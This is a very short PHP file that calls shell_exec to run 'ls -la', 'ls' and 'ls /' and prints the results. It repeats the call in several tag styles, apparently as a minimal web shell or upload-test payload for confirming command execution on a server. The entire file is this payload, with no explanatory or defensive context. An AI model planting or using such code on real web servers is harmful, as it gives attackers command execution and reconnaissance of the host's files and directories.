
<?php echo "<pre>" . shell_exec('ls -la') . "</pre>";?>
</br></br></br></br></br>
<? echo "<pre>" . shell_exec('ls -la') . "</pre>";?>
</br></br></br></br></br>
<? echo "<pre>" . shell_exec('ls') . "</pre>";?>
</br></br></br></br></br>
<? echo "<pre>" . shell_exec('ls /') . "</pre>";?>